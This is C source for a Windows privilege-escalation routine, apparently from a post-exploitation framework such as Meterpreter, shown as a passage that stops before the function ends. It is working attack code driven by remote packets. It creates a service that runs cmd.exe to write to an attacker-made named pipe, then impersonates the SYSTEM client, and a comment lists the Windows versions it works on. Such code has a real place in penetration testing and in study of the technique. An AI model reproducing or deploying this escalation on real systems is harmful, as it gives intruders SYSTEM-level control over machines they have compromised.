/*
 * Elevate from local admin to local system via Named Pipe Impersonation. We spawn a cmd.exe under local
 * system which then connects to our named pipe and we impersonate this client. This can be done by an
 * Administrator without the need for SeDebugPrivilege.  Works on 2000, XP, 2003 and 2008 for all local
 * administrators. On Vista and 7 it will only work if the host process has been elevated through UAC
 * first. Does not work on NT4.
 */
DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
{
	DWORD dwResult              = ERROR_SUCCESS;
	char * cpServiceName        = NULL;
	THREAD * pThread            = NULL;
	HANDLE hSem                 = NULL;
	char cServiceArgs[MAX_PATH] = {0};
	char cServicePipe[MAX_PATH] = {0};
	OSVERSIONINFO os            = {0};

	do {
		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

		if (!GetVersionEx(&os)) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: GetVersionEx failed")
		}

		// filter out Windows NT4
		if (os.dwMajorVersion == 4 && os.dwMinorVersion == 0) {
			SetLastError(ERROR_ACCESS_DENIED);
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: Windows NT4 not supported.")
		}

		cpServiceName = packet_get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_NAME);
		if (!cpServiceName) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. invalid arguments",
				ERROR_BAD_ARGUMENTS);
		}

		_snprintf_s(cServicePipe, sizeof(cServicePipe), MAX_PATH,
			"\\\\.\\pipe\\%s", cpServiceName);

		_snprintf_s(cServiceArgs, sizeof(cServiceArgs), MAX_PATH,
			"cmd.exe /c echo %s > %s", cpServiceName, cServicePipe);

		hSem = CreateSemaphore(NULL, 0, 1, NULL);
		pThread = thread_create(elevate_namedpipe_thread, &cServicePipe, remote, hSem);
		if (!pThread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. thread_create failed",
				ERROR_INVALID_HANDLE);
		}

		if (!thread_run(pThread)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. thread_run failed",
				ERROR_ACCESS_DENIED);
		}

		//wait for the thread to create the pipe(if it times out terminate)
                if (hSem) {
		        if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
			        BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. WaitForSingleObject failed",
					ERROR_ACCESS_DENIED);
			}
                } else {
                        Sleep(500);
		}

		// start the elevator service (if it doesnt start first time we need to create it and then start it).
		if (service_start(cpServiceName) != ERROR_SUCCESS) {
			dprintf("[ELEVATE] service starting failed, attempting to create");
			if (service_create(cpServiceName, cServiceArgs) != ERROR_SUCCESS) {
				BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe. service_create failed");
			}
			dprintf("[ELEVATE] creation of service succeeded, attempting to start");
			// we dont check a return value for service_start as we expect it to fail as cmd.exe is not
			// a valid service and it will never signal to the service manager that is is a running service.
			service_start(cpServiceName);
		}

		// signal our thread to terminate if it is still running
		thread_sigterm(pThread);

		// and wait for it to terminate...
		thread_join(pThread);

		// get the exit code for our pthread
		dprintf("[ELEVATE] dwResult before exit code: %u", dwResult);
		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. GetExitCodeThread failed",
				ERROR_INVALID_HANDLE);
		}
		dprintf("[ELEVATE] dwResult after exit code: %u", dwResult);

	} while (0);